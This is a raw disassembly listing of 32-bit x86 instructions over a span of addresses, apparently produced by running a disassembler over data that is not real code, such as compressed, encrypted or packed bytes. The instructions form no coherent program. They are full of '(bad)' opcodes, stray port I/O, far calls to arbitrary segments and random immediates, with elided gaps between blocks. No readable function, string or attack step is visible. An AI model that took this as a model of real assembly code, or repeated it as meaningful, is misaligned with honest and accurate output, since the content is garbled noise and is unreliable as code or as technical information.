  42e9a6:	xchg   esi,eax
  42e9a7:	jne    0x42e953
  42e9a9:	dec    ebp
  42e9aa:	dec    ecx
  42e9ab:	loop   0x42e9b8
  42e9ad:	mov    dh,0xac
  42e9af:	mov    dl,0xee
  42e9b1:	inc    ecx
  42e9b2:	scas   eax,DWORD PTR es:[edi]
  42e9b3:	xchg   esi,eax
  42e9b4:	in     al,dx
	...
  42ea15:	add    ch,ah
  42ea17:	mov    edx,0xebdfe392
  42ea1c:	cmc    
  42ea1d:	mov    esi,0xe8a967c2
  42ea22:	dec    edi
  42ea23:	xchg   DWORD PTR ds:0x1f3b8c9,esi
  42ea29:	add    BYTE PTR [edi],al
  42ea2b:	add    DWORD PTR [eax],eax
  42ea2d:	add    BYTE PTR ds:0xdab0f173,ah
  42ea33:	aad    0x2f
  42ea35:	icebp  
  42ea36:	jecxz  0x42e9b9
  42ea38:	cmp    eax,0x90988795
  42ea3d:	fisttp DWORD PTR [eax-0x3f]
  42ea40:	js     0x42ea4a
  42ea42:	int    0x98
  42ea44:	sbb    BYTE PTR ds:0x3afdf0a3,dl
  42ea4a:	mov    ds:0xd2af5cdc,eax
  42ea4f:	fimul  WORD PTR ds:0x61446419
  42ea55:	int3   
  42ea56:	ret    
  42ea57:	adc    BYTE PTR [edi+0x5ccbef97],ah
  42ea5d:	popf   
  42ea5e:	add    edx,DWORD PTR [ebx]
  42ea60:	pop    ebx
  42ea61:	sub    eax,0x768544dd
  42ea66:	mov    ch,0x63
  42ea68:	(bad)  
  42ea6a:	sbb    eax,0xe921debb
  42ea6f:	les    ecx,FWORD PTR [edi+0x1a]
  42ea72:	in     eax,0x4d
  42ea74:	or     DWORD PTR [edi-0x253586e7],0x87f61090
  42ea7e:	sub    al,0x23
  42ea80:	push   cs
  42ea81:	xor    DWORD PTR [eax+ebp*2+0xce05fbf],esp
  42ea88:	sub    al,0xb7
  42ea8a:	int    0xf1
  42ea8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ea8d:	push   esi
  42ea8e:	cmp    edx,DWORD PTR [eax-0x1180403d]
  42ea94:	xchg   edx,eax
  42ea95:	pop    ecx
  42ea96:	mov    BYTE PTR [eax+0x295cd001],al
  42ea9c:	push   edi
  42ea9d:	xlat   BYTE PTR ds:[ebx]
  42ea9e:	dec    edx
  42ea9f:	push   cs
  42eaa0:	aad    0x31
  42eaa2:	xchg   ebx,eax
  42eaa3:	imul   esi,edx,0xffffff96
  42eaa6:	pop    ds
  42eaa7:	outs   dx,DWORD PTR ds:[esi]
  42eaa8:	or     bh,bl
  42eaaa:	(bad)  
  42eaab:	push   esp
  42eaac:	popa   
  42eaad:	xor    ebx,esp
  42eaaf:	aad    0x96
  42eab1:	stos   BYTE PTR es:[edi],al
  42eab2:	push   edx
  42eab3:	mov    al,ds:0x8e9bfc4d
  42eab8:	xor    al,0x19
  42eaba:	mov    ch,0xde
  42eabc:	jmp    DWORD PTR [ecx-0x19abf74e]
  42eac2:	inc    ebp
  42eac3:	jbe    0x42eac9
  42eac5:	mul    ebp
  42eac7:	and    bh,ah
  42eac9:	adc    al,0xa7
  42eacb:	dec    ebx
  42eacc:	inc    ecx
  42eacd:	clc    
  42eace:	or     ebp,DWORD PTR [eax+0x7a]
  42ead1:	sub    eax,0x4be37e5
  42ead6:	scas   eax,DWORD PTR es:[edi]
  42ead7:	push   ecx
  42ead8:	xchg   esp,eax
  42ead9:	lods   eax,DWORD PTR ds:[esi]
  42eada:	fistp  DWORD PTR [edi-0x14]
  42eadd:	loop   0x42eabd
  42eadf:	inc    esi
  42eae0:	sub    al,0xd6
  42eae2:	xor    eax,0x3f9ebf9a
  42eae7:	sbb    DWORD PTR [edi-0x45258b7d],esp
  42eaed:	xchg   ebp,eax
  42eaee:	mov    esp,0x19a9a3d5
  42eaf3:	mov    cl,0x3
  42eaf5:	mov    ecx,0xe8f10b3f
  42eafa:	(bad)  
  42eafb:	or     ch,BYTE PTR [esi]
  42eafd:	in     al,dx
  42eafe:	sbb    eax,ebx
  42eb00:	loope  0x42ea86
  42eb02:	or     al,0x60
  42eb04:	lock sbb al,0x9c
  42eb07:	les    edx,FWORD PTR [esi+0x2b]
  42eb0a:	or     eax,0xafcd675f
  42eb0f:	xor    edx,DWORD PTR [edi]
  42eb11:	rcl    DWORD PTR [esi+0x19],1
  42eb14:	scas   eax,DWORD PTR es:[edi]
  42eb15:	xor    BYTE PTR [esi],dh
  42eb17:	lahf   
  42eb18:	in     eax,0x3
  42eb1a:	out    dx,eax
  42eb1b:	cdq    
  42eb1c:	fbstp  TBYTE PTR [edi+0x2c8cd098]
  42eb22:	pop    edx
  42eb23:	xor    edx,ebx
  42eb25:	dec    eax
  42eb26:	mov    bl,BYTE PTR [ecx+0x78fecbb7]
  42eb2c:	push   esi
  42eb2d:	addr16 mov edi,0x1dd3c31c
  42eb33:	je     0x42eae1
	...
  42eb95:	add    BYTE PTR [esi+0x41],bh
  42eb98:	jne    0xfc41badd
  42eb9e:	add    DWORD PTR [edi+0x1ce15ada],ebp
  42eba4:	push   eax
  42eba5:	outs   dx,BYTE PTR ds:[esi]
  42eba6:	mov    edi,0x70001f4
  42ebab:	add    DWORD PTR [eax],eax
  42ebad:	add    BYTE PTR [ebx+eiz*4-0x1c],ah
  42ebb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ebb2:	mov    esp,0x301fe7f1
  42ebb7:	xchg   esi,eax
  42ebb8:	out    dx,eax
  42ebb9:	push   ds
  42ebba:	xor    eax,0xe734ad90
  42ebbf:	mov    edi,0x628a8c46
  42ebc4:	popf   
  42ebc5:	push   cs
  42ebc6:	cld    
  42ebc7:	test   DWORD PTR [edi+edi*4+0x1fa0cc7f],esp
  42ebce:	xor    eax,0x51c3d083
  42ebd3:	jbe    0x42ec53
  42ebd5:	xor    dh,ch
  42ebd7:	imul   edi,DWORD PTR [edi+0xbaf4041],0xa8a8577a
  42ebe1:	mov    dh,0xb9
  42ebe3:	inc    ebx
  42ebe4:	xor    al,0x8e
  42ebe6:	popa   
  42ebe7:	adc    eax,0xd5744c47
  42ebec:	sar    DWORD PTR [ecx],0xb
  42ebef:	xor    DWORD PTR [esi-0x15bbc3dc],esi
  42ebf5:	fs sahf 
  42ebf7:	shr    BYTE PTR [ebx+ecx*1],0x78
  42ebfb:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  42ebfd:	outs   dx,DWORD PTR ds:[esi]
  42ebfe:	xchg   ebp,eax
  42ebff:	sub    eax,ebp
  42ec01:	dec    edi
  42ec02:	and    DWORD PTR gs:[ecx+0xf],edx
  42ec06:	add    esp,0x1824109a
  42ec0c:	adc    edx,0x63
  42ec0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ec10:	dec    edx
  42ec11:	jns    0x42eb9b
  42ec13:	push   edx
  42ec14:	sbb    eax,0xc6a6ed98
  42ec19:	pop    es
  42ec1a:	aad    0x7e
  42ec1c:	imul   edx,ecx,0xffffffc9
  42ec1f:	data16 ror BYTE PTR [esi],0x5e
  42ec23:	cmp    BYTE PTR [ebx-0x7c776c76],al
  42ec29:	retf   
  42ec2a:	aad    0x3b
  42ec2c:	iret   
  42ec2d:	imul   ecx,DWORD PTR [edi],0xeb55ae78
  42ec33:	jmp    0x42ec44
  42ec35:	mov    esi,DWORD PTR [ecx]
  42ec37:	xor    bl,cl
  42ec39:	adc    eax,0x1daecf18
  42ec3e:	push   es
  42ec3f:	adc    dl,ch
  42ec41:	pop    eax
  42ec42:	into   
  42ec43:	sbb    al,0x22
  42ec45:	pop    edx
  42ec46:	sub    al,0x88
  42ec48:	stc    
  42ec49:	add    DWORD PTR [ecx+ebp*1],ebx
  42ec4c:	out    0xa8,al
  42ec4e:	iret   
  42ec4f:	mov    eax,ds:0xc3acf9bc
  42ec54:	and    dl,cl
  42ec56:	pop    ebp
  42ec57:	jae    0x42ec5e
  42ec59:	xor    ah,BYTE PTR cs:[eax+0x5055c56a]
  42ec60:	fcomp  QWORD PTR [edi]
  42ec62:	iret   
  42ec63:	stc    
  42ec64:	xchg   edx,eax
  42ec65:	fwait
  42ec66:	xchg   ebx,eax
  42ec67:	inc    edi
  42ec68:	mov    ds:0x9ca7b0fc,eax
  42ec6d:	xor    ax,0xf680
  42ec71:	stc    
  42ec72:	dec    ecx
  42ec73:	push   0x2c3cff7
  42ec78:	rcl    BYTE PTR [ecx+0x1d00caf7],cl
  42ec7e:	push   ecx
  42ec7f:	sysexit 
  42ec81:	(bad)  
  42ec82:	xor    al,0x2e
  42ec84:	(bad)  
  42ec85:	or     esp,esi
  42ec87:	jbe    0x42eca9
  42ec89:	push   es
  42ec8a:	jge    0x42ec33
  42ec8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ec8d:	xchg   esi,eax
  42ec8e:	mov    bh,0xb2
  42ec90:	sub    ax,0x1284
  42ec94:	(bad)  [edi-0x1d]
  42ec97:	mov    ?,WORD PTR [edi-0x64]
  42ec9a:	pop    es
  42ec9b:	inc    edx
  42ec9c:	push   ss
  42ec9d:	fldenv [edx]
  42ec9f:	aam    0xe0
  42eca1:	rcr    ecx,cl
  42eca3:	sub    edi,DWORD PTR [ecx-0x787523a4]
  42eca9:	in     al,dx
  42ecaa:	(bad)  
  42ecae:	push   ebp
  42ecaf:	adc    al,0x3c
  42ecb1:	push   ebp
  42ecb2:	pop    ds
  42ecb3:	dec    edx
  42ecb4:	push   ds
	...
  42ed15:	add    BYTE PTR [edx],ch
  42ed17:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed1d:	idiv   BYTE PTR [esi+0x25f0a17f]
  42ed23:	inc    edx
  42ed24:	out    dx,eax
  42ed25:	call   0x107:0x1f5c6
  42ed2c:	add    BYTE PTR [eax],al
  42ed2e:	xchg   ebx,eax
  42ed2f:	test   BYTE PTR [ecx-0x6f57f6cf],cl
  42ed35:	sar    DWORD PTR [esi],1
  42ed37:	hlt    
  42ed38:	pop    esp
  42ed39:	add    BYTE PTR fs:[ebx+0x2b6ae2e0],0xac
  42ed41:	jbe    0x42ed9f
  42ed43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ed44:	les    edi,FWORD PTR [ebx]
  42ed46:	xchg   esp,eax
  42ed47:	sbb    eax,edx
  42ed49:	fnstsw WORD PTR [ebx]
  42ed4b:	mov    ds:0x4b5e566d,al
  42ed50:	sbb    BYTE PTR cs:[edx],bl
  42ed53:	(bad)  
  42ed54:	jbe    0x42ed8f
  42ed56:	pop    ebp
  42ed57:	jns    0x42ed08
  42ed59:	mov    bh,BYTE PTR [ebx]
  42ed5b:	sbb    edx,DWORD PTR [edi-0x3b369274]
  42ed61:	xor    ecx,DWORD PTR [ebx]
  42ed63:	push   cs
  42ed64:	leave  
  42ed65:	leave  
  42ed66:	loop   0x42ed01
  42ed68:	out    0xa3,al
  42ed6a:	jb     0x42ed3a
  42ed6c:	push   ecx
  42ed6d:	repz and cl,bl
  42ed70:	cmp    al,0xba
  42ed72:	fldenv [eax]
  42ed74:	pop    es
  42ed75:	push   edi
  42ed76:	mov    cl,0xb9
  42ed78:	sub    DWORD PTR ds:0x44cf4b6f,ecx
  42ed7e:	lods   al,BYTE PTR ds:[esi]
  42ed7f:	ret    0xc894
  42ed82:	sbb    ah,0x28
  42ed85:	dec    edi
  42ed86:	push   cs
  42ed87:	mov    eax,ds:0x85ea203c
  42ed8c:	cmp    cl,BYTE PTR [ebp+0x22]
  42ed8f:	add    esp,ebx
  42ed91:	mov    al,0x14
  42ed93:	push   eax
  42ed94:	push   cs
  42ed95:	jp     0x42edc5
  42ed97:	pop    ebp
  42ed98:	test   ch,ah
  42ed9a:	mov    edi,0x7b127847
  42ed9f:	xor    eax,0x1e0cacaf
  42eda4:	dec    esi
  42eda5:	mov    eax,0x79d21dc
  42edaa:	loopne 0x42ed5e
  42edac:	jge    0x42ed86
  42edae:	into   
  42edaf:	ficomp DWORD PTR [ebx]
  42edb1:	aas    
  42edb2:	dec    ebx
  42edb3:	adc    DWORD PTR [ebp-0x1c0fe520],0xd871a934
  42edbd:	add    al,BYTE PTR [ebp+0x54]
  42edc0:	jno    0x42eda3
  42edc2:	fld    QWORD PTR [ebx-0x3a]
  42edc5:	std    
  42edc6:	sahf   
  42edc7:	pop    edx
  42edc8:	sub    eax,0xc2f32e56
  42edcd:	jno    0x42ee41
  42edcf:	call   0x49fbc7a6
  42edd4:	mov    dl,0x52
  42edd6:	out    0x4c,eax
  42edd8:	shl    BYTE PTR [esi],cl
  42edda:	popa   
  42eddb:	mov    edi,0xf467b734
  42ede0:	jno    0x42edc0
  42ede2:	cmp    al,0x6
  42ede4:	loopne 0x42ee25
  42ede6:	pop    ecx
  42ede7:	sbb    ch,BYTE PTR [esi]
  42ede9:	inc    esi
  42edea:	dec    eax
  42edeb:	aas    
  42edec:	inc    eax
  42eded:	je     0x42edd3
  42edef:	retf   0xa36c
  42edf2:	mov    ah,0x1a
  42edf4:	dec    edx
  42edf5:	test   DWORD PTR [ebx+edi*4-0x305d65d9],esi
  42edfc:	pop    edx
  42edfd:	xor    DWORD PTR [esi+0xe],edi
  42ee00:	pushf  
  42ee01:	push   edx
  42ee02:	rol    ecx,1
  42ee04:	cmp    eax,0x673408ad
  42ee09:	add    edx,DWORD PTR [edx+0xe]
  42ee0c:	and    esi,DWORD PTR [edi]
  42ee0e:	push   ds
  42ee0f:	adc    BYTE PTR [ebx],bl
  42ee11:	cmp    BYTE PTR [eax-0x35],cl
  42ee14:	push   esi
  42ee15:	jmp    0xcae4315
  42ee1a:	fisub  DWORD PTR [edx+eiz*2]
  42ee1d:	sub    DWORD PTR [ebp+0x45],ebx
  42ee20:	or     DWORD PTR [ecx+0x3acdb228],esi
  42ee26:	(bad)  
  42ee27:	jb     0x42ee31
  42ee29:	(bad)  
  42ee2a:	in     eax,dx
  42ee2b:	mov    BYTE PTR [ecx+eiz*2-0x61ce27a6],dh
  42ee32:	test   al,0x6f
  42ee34:	add    eax,0x0
	...
  42ee95:	add    bl,al
  42ee97:	add    cl,BYTE PTR [eax]
  42ee99:	xor    eax,0xf6ff3fc9
  42ee9e:	sub    DWORD PTR ds:0xf061f479,edi
  42eea4:	lds    ecx,FWORD PTR [ecx-0x33]
  42eea7:	test   BYTE PTR [ecx],0x0
  42eeaa:	pop    es
  42eeab:	add    DWORD PTR [eax],eax
  42eead:	add    al,bh
  42eeaf:	repz out 0x64,al
  42eeb2:	adc    ebp,edi
  42eeb4:	cmc    
  42eeb5:	stos   BYTE PTR es:[edi],al
  42eeb6:	aad    0x9b
  42eeb8:	fstp   DWORD PTR [eax+0x4d511d58]
  42eebe:	inc    ebx
  42eebf:	xor    eax,0xce36b543
  42eec4:	sub    BYTE PTR [ebp-0x63],cl
  42eec7:	pusha  
  42eec8:	xor    eax,0xe4a06129
  42eecd:	fdiv   QWORD PTR [ebx-0x46]
  42eed0:	jns    0x42ef3c
  42eed2:	jge    0x42ef46
  42eed4:	adc    BYTE PTR [edx],cl
  42eed6:	(bad)  
  42eed7:	arpl   WORD PTR ds:0x997013cb,bx
  42eedd:	sbb    al,0xdc
  42eedf:	xchg   edx,eax
  42eee0:	pop    edx
  42eee1:	lods   eax,DWORD PTR ds:[esi]
  42eee2:	sbb    ebp,DWORD PTR [esp+ebx*2-0x181c8aae]
  42eee9:	add    al,0xb7
  42eeeb:	push   eax
  42eeec:	fld    QWORD PTR [ecx]
  42eeee:	rcr    DWORD PTR [edi-0x47],0x4d
  42eef2:	xor    DWORD PTR [ebx+esi*2-0x70],ebp
  42eef6:	jno    0x42ef4d
  42eef8:	and    eax,0xb7c6c983
  42eefd:	push   0xffffff8a
  42eeff:	cmp    DWORD PTR [ebx+0x61e74373],esp
  42ef05:	jle    0x42ee90
  42ef07:	(bad)  
  42ef09:	xor    esi,DWORD PTR [eax+ebp*8]
  42ef0c:	lds    edi,FWORD PTR [edx-0x3a]
  42ef0f:	dec    edx
  42ef10:	pop    ebx
  42ef11:	fld    st(6)
  42ef13:	(bad)  
  42ef14:	pop    ecx
  42ef15:	inc    esi
  42ef16:	imul   edx,DWORD PTR [eax+ebp*1-0x2195b024],0x7e95de36
  42ef21:	je     0x42ef22
  42ef23:	dec    esp
  42ef24:	sub    edi,esp
  42ef26:	shl    BYTE PTR [edi+edx*1+0x7d],cl
  42ef2a:	jmp    0xc074:0xdf2db086
  42ef31:	xchg   esp,eax
  42ef32:	cmc    
  42ef33:	sbb    al,bl
  42ef35:	test   bh,dh
  42ef37:	sbb    cl,BYTE PTR [eax-0x2d]
  42ef3a:	jge    0x42ef46
  42ef3c:	into   
  42ef3d:	std    
  42ef3e:	pop    esp
  42ef3f:	push   0x3e98f7da
  42ef44:	fcomp  DWORD PTR [edi+0x37]
  42ef47:	push   es
  42ef48:	sahf   
  42ef49:	gs cmp dx,si
  42ef4d:	push   es
  42ef4e:	add    BYTE PTR [ebx],dl
  42ef50:	xor    eax,0x823e08b9
  42ef55:	mov    ebx,0xaee00100
  42ef5a:	jns    0x42ef12
  42ef5c:	cdq    
  42ef5d:	sub    eax,0xc8972641
  42ef62:	adc    dl,BYTE PTR [eax]
  42ef64:	test   BYTE PTR [ebp-0x1c],ah
  42ef67:	jecxz  0x42ef1a
  42ef69:	push   edx
  42ef6a:	or     ebx,DWORD PTR [edi+0x39]
  42ef6d:	xor    BYTE PTR [eax-0x35a2adc9],bl
  42ef73:	push   0xffffffb1
  42ef75:	jmp    0x42ef5d
  42ef77:	xlat   BYTE PTR ds:[ebx]
  42ef78:	mov    ah,0x61
  42ef7a:	jo     0x42ef0a
  42ef7c:	fistp  DWORD PTR [edx+0x486aa6c2]
  42ef82:	out    0xb9,eax
  42ef84:	shr    DWORD PTR [eax],1
  42ef86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ef87:	cwde   
  42ef88:	out    0x44,eax
  42ef8a:	mov    ds:0x2af02038,al
  42ef8f:	stc    
  42ef90:	push   esp
  42ef91:	jnp    0x42f00d
  42ef93:	jo     0x42eff4
  42ef95:	sbb    edx,DWORD PTR [edi-0x314e61a4]
  42ef9b:	test   al,0x77
  42ef9d:	or     BYTE PTR [edi+0x1b],bh
  42efa0:	lods   al,BYTE PTR ds:[esi]
  42efa1:	and    al,0x84
  42efa3:	outs   dx,BYTE PTR ds:[esi]
  42efa4:	mov    dl,0x18
  42efa6:	ins    BYTE PTR es:[edi],dx
  42efa7:	cmp    ebx,eax
  42efa9:	push   ss
  42efaa:	sar    DWORD PTR [ebp-0x5c0a45a5],1
  42efb0:	rcr    BYTE PTR [eax+0x6bac23],cl
	...
  42f016:	adc    bh,BYTE PTR [esi]
  42f018:	int    0xe5
  42f01a:	in     eax,dx
  42f01b:	idiv   DWORD PTR [edx]
  42f01d:	call   edx
  42f01f:	sbb    eax,0xf402d516
  42f024:	test   BYTE PTR [eax+0x1f7d4],ah
  42f02a:	pop    es
  42f02b:	add    DWORD PTR [eax],eax
  42f02d:	add    BYTE PTR [ebx],al
  42f02f:	dec    edx
  42f030:	test   eax,0x5bd531f2
  42f035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f036:	inc    esi
  42f037:	loope  0x42f02f
  42f039:	enter  0x4be5,0x20
  42f03d:	lahf   
  42f03e:	imul   edi,DWORD PTR [ebp+0x173cd1b],0x72
  42f045:	xor    al,0x63
  42f047:	mov    ds:0x7434afe0,eax
  42f04c:	mov    cs,WORD PTR [esp+ebp*4-0x1]
  42f050:	cdq    
  42f051:	dec    ebx
  42f052:	or     eax,0xd2eb2db
  42f057:	mov    eax,ds:0x396a742d
  42f05c:	dec    esi
  42f05d:	(bad)  
  42f05e:	cmp    eax,0xbfb70dac
  42f063:	icebp  
  42f064:	out    dx,eax
  42f065:	and    eax,0xe10ce457
  42f06a:	xor    eax,0x903504ae
  42f06f:	clc    
  42f070:	add    bh,bl
  42f072:	and    DWORD PTR [ebx-0x44],0x2af769b2
  42f079:	mov    dh,0x45
  42f07b:	mov    ebp,0x724da361
  42f080:	cmp    DWORD PTR [edx],ebp
  42f082:	(bad)  
  42f083:	imul   edx,DWORD PTR [ebx],0xffffffb3
  42f086:	stos   DWORD PTR es:[edi],eax
  42f087:	mov    al,ds:0xd7d86997
  42f08c:	jne    0x42f057
  42f08e:	jnp    0x42f037
  42f090:	jno    0x42f046
  42f092:	jb     0x42f086
  42f094:	and    DWORD PTR [edi+esi*8+0x5f],0x6d6dbe6d
  42f09c:	mov    esp,edi
  42f09e:	ds ins BYTE PTR es:[edi],dx
  42f0a0:	call   0xce09:0xc1ca7b4c
  42f0a7:	call   0x9854:0xb18d0400
  42f0ae:	loop   0x42f10e
  42f0b0:	jae    0x42f048
  42f0b2:	fild   DWORD PTR [ecx+edx*1-0x32]
  42f0b6:	sbb    DWORD PTR [edi-0x52],edi
  42f0b9:	test   eax,0x89290720
  42f0be:	xchg   esi,eax
  42f0bf:	mov    ebx,0x1e0f9d9c
  42f0c4:	adc    eax,0x76bfda0a
  42f0c9:	test   eax,0x963d0c9
  42f0ce:	sti    
  42f0cf:	inc    ebx
  42f0d0:	shl    DWORD PTR [ecx],cl
  42f0d2:	fist   DWORD PTR [edi]
  42f0d4:	add    ecx,DWORD PTR [eax-0x5acb9f43]
  42f0da:	cmp    al,0xcd
  42f0dc:	test   DWORD PTR [ecx+ebp*4-0x53],edx
  42f0e0:	iret   
  42f0e1:	jge    0x42f0d3
  42f0e3:	inc    edx
  42f0e4:	mov    esp,0x722e4878
  42f0e9:	or     bl,al
  42f0eb:	mov    ch,0xc9
  42f0ed:	pusha  
  42f0ee:	pop    edx
  42f0ef:	jecxz  0x42f124
  42f0f1:	out    dx,eax
  42f0f2:	push   ebx
  42f0f3:	out    0xb6,al
  42f0f5:	inc    esp
  42f0f6:	jge    0x42f0c9
  42f0f8:	shl    BYTE PTR [edi],0x73
  42f0fb:	(bad)  
  42f0fc:	retf   
  42f0fd:	or     al,0x94
  42f0ff:	pop    edi
  42f100:	ror    DWORD PTR [edx],cl
  42f102:	xor    DWORD PTR gs:[edi-0x7f],0xbe2a6f60
  42f10a:	xor    edi,DWORD PTR [eax]
  42f10c:	sub    esi,esp
  42f10e:	dec    esp
  42f10f:	xchg   ebx,eax
  42f110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f111:	pop    ss
  42f112:	mov    dl,0x6d
  42f114:	cmp    DWORD PTR [edx+0x22c72863],ebx
  42f11a:	ficomp WORD PTR [esi+0x34]
  42f11d:	std    
  42f11e:	(bad)  
  42f11f:	aaa    
  42f120:	adc    ecx,ecx
  42f122:	or     BYTE PTR [eax],0x12
  42f125:	mov    cl,0x9c
  42f127:	daa    
  42f128:	(bad)  [ecx]
  42f12a:	jne    0x42f0ad
  42f12c:	rcr    ebx,0x99
  42f12f:	(bad)  
  42f130:	pop    edi
  42f131:	or     DWORD PTR [ebx-0x73],ebp
  42f134:	mov    edx,0x0
	...
  42f195:	add    BYTE PTR [edx+0x26],bl
  42f198:	jecxz  0x42f1dd
  42f19a:	inc    edi
  42f19c:	cli    
  42f19d:	aas    
  42f19e:	clc    
  42f19f:	fdivr  st(3),st
  42f1a1:	jne    0x42f186
  42f1a3:	push   cs
  42f1a4:	fldenv [ebx]
  42f1a6:	(bad)  
  42f1a8:	add    DWORD PTR [eax],eax
  42f1aa:	pop    es
  42f1ab:	add    DWORD PTR [eax],eax
  42f1ad:	add    cl,cl
  42f1af:	add    al,0x76
  42f1b1:	call   0xf5cb:0x8dc7d556
  42f1b8:	mov    ds:0xcc39ac94,eax
  42f1bd:	ss mov al,0x30
  42f1c0:	pushf  
  42f1c1:	push   esi
  42f1c2:	mov    ecx,0x1dfb1b2e
  42f1c7:	imul   DWORD PTR [ebp-0x1a408cd7]
  42f1cd:	ret    0x62c7
  42f1d0:	std    
  42f1d1:	jb     0x42f185
  42f1d3:	int3   
  42f1d4:	dec    ebp
  42f1d5:	adc    ecx,DWORD PTR [ecx]
  42f1d7:	ss retf 
  42f1d9:	and    BYTE PTR ds:0xc95b73dd,bl
  42f1df:	jl     0x42f209
  42f1e1:	jmp    0x5137:0xe9d4d5ed
  42f1e8:	sbb    cl,0xcb
  42f1eb:	fwait
  42f1ec:	and    ecx,eax
  42f1ee:	push   ecx
  42f1ef:	cwde   
  42f1f0:	jl     0x42f261
  42f1f2:	xor    BYTE PTR [ebx+0x194d28c],bh
  42f1f8:	dec    ebp
  42f1f9:	mov    dl,0xe3
  42f1fb:	or     al,0x87
  42f1fd:	(bad)  [ebp-0x475eeeef]
  42f203:	ins    DWORD PTR es:[edi],dx
  42f204:	test   al,0x77
  42f206:	pop    ebx
  42f207:	icebp  
  42f208:	jne    0x42f1ac
  42f20a:	or     al,dl
  42f20c:	inc    esp
  42f20d:	mov    DWORD PTR [edi-0x63],ebx
  42f210:	jmp    0x14c264f9
  42f215:	adc    DWORD PTR [edx-0x7804c113],esp
  42f21b:	adc    ebx,DWORD PTR ds:0x2734de7a
  42f221:	sub    DWORD PTR [ebp+0x36],esi
  42f224:	dec    ebp
  42f225:	pop    eax
  42f226:	or     eax,0x8ff5e80
  42f22b:	push   0x9d262853
  42f230:	inc    esi
  42f231:	push   eax
  42f232:	xchg   BYTE PTR ds:0xec08b179,dh
  42f238:	enter  0x17c3,0x3
  42f23c:	lock pop eax
  42f23e:	mov    ecx,0x8549acc3
  42f243:	adc    BYTE PTR [esp+ebx*1+0x3631166a],al
  42f24a:	adc    ah,BYTE PTR [ebx+0x16]
  42f24d:	rcl    BYTE PTR [ecx+0x41],cl
  42f250:	jns    0x42f2c3
  42f252:	stos   DWORD PTR es:[edi],eax
  42f253:	cmp    bh,0x1d
  42f256:	jno    0x42f2b2
  42f258:	jp     0x42f267
  42f25a:	xchg   edx,eax
  42f25b:	xor    BYTE PTR [eax-0x64],dl
  42f25e:	lahf   
  42f25f:	lea    ebp,[ebp-0x7060a152]
  42f265:	neg    BYTE PTR [esi-0x62d694c]
  42f26b:	add    BYTE PTR [ebp-0x7a61d507],0xcc
  42f272:	imul   eax,ebp,0xffffffac
  42f275:	adc    DWORD PTR [edx+0x35],0x30520e82
  42f27c:	mov    ds:0x7b31ebe,eax
  42f281:	dec    ecx
  42f282:	sbb    eax,DWORD PTR [esp+ecx*1-0x3c]
  42f286:	jle    0x42f2a7
  42f288:	stos   DWORD PTR es:[edi],eax
  42f289:	cmp    ebp,DWORD PTR [ecx]
  42f28b:	test   al,0x85
  42f28d:	inc    esi
  42f28e:	add    BYTE PTR [ebx+0x55],bh
  42f291:	jmp    0x42f279
  42f293:	mul    BYTE PTR [edi-0x66]
  42f296:	ins    DWORD PTR es:[edi],dx
  42f297:	rol    ebp,cl
  42f299:	xor    al,BYTE PTR [esi-0x16c89b11]
  42f29f:	test   DWORD PTR [eax+edx*1-0x77b35be6],esp
  42f2a6:	push   edi
  42f2a7:	xchg   esi,eax
  42f2a8:	inc    eax
  42f2a9:	inc    ebp
  42f2aa:	mov    edx,0x7c1cd22c
  42f2af:	(bad)  
  42f2b0:	loope  0x42f29e
  42f2b2:	retf   
  42f2b3:	pop    esp
  42f2b4:	push   eax
	...
  42f315:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f31b:	call   0x6da4:0xb5dd3fbf
  42f322:	jns    0x42f348
  42f324:	outs   dx,BYTE PTR ds:[esi]
  42f325:	sub    eax,0x1f9e2
  42f32a:	pop    es
  42f32b:	add    DWORD PTR [eax],eax
  42f32d:	add    BYTE PTR [edx-0x59],cl
  42f330:	int    0xa
  42f332:	(bad)
  42f337:	sbb    eax,0x9fa71f6c
  42f33c:	cwde   
  42f33d:	or     DWORD PTR [eax+0x69896333],0x6a8aeb43
  42f347:	push   eax
  42f348:	out    0xda,al
  42f34a:	aad    0x19
  42f34c:	dec    edi
  42f34d:	mov    al,ds:0x7eade784
  42f352:	mov    ebp,?
  42f354:	xchg   DWORD PTR [esi+esi*8+0x8105e3f],eax
  42f35b:	jns    0x42f3b2
  42f35d:	loop   0x42f338
  42f35f:	cmp    dl,al
  42f361:	int    0xd0
  42f363:	cmp    BYTE PTR [esp+edi*4+0x7e],dh
  42f367:	mov    cl,cl
  42f369:	jae    0x42f328
  42f36b:	adc    bh,ah
  42f36d:	adc    eax,0x8a65b228
  42f372:	dec    edx
  42f373:	int3   
  42f374:	or     DWORD PTR [ecx+0x5a],eax
  42f377:	pop    esp
  42f378:	clc    
  42f379:	inc    ecx
  42f37a:	sti    
  42f37b:	sub    DWORD PTR [edx+0x2eec7aed],ebx
  42f381:	add    ebp,DWORD PTR [edi]
  42f383:	pop    esi
  42f384:	jg     0x42f30e
  42f386:	ss call 0xf71e19cf
  42f38c:	in     al,dx
  42f38d:	out    0x85,eax
  42f38f:	cmp    DWORD PTR [edi],ebx
  42f391:	pop    esp
  42f392:	stc    
  42f393:	push   ebx
  42f394:	jb     0x42f31b
  42f396:	mov    ds,WORD PTR [edi+ecx*4+0x15]
  42f39a:	scas   eax,DWORD PTR es:[edi]
  42f39b:	mov    edx,0xc3d003ed
  42f3a0:	arpl   WORD PTR ds:0x4f44d806,bp
  42f3a6:	push   ebx
  42f3a7:	add    eax,0xb308b3a5
  42f3ac:	cwde   
  42f3ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f3ae:	sti    
  42f3af:	or     al,0x88
  42f3b1:	push   edi
  42f3b2:	(bad)
  42f3b7:	jl     0x42f3d0
  42f3b9:	(bad)  
  42f3ba:	lock sub al,0x64
  42f3bd:	sbb    bl,BYTE PTR [esi]
  42f3bf:	pop    esp
  42f3c0:	enter  0xebcd,0xd
  42f3c4:	imul   edi,DWORD PTR [eax+0x5e],0xcbbda71d
  42f3cb:	in     eax,dx
  42f3cc:	push   ds
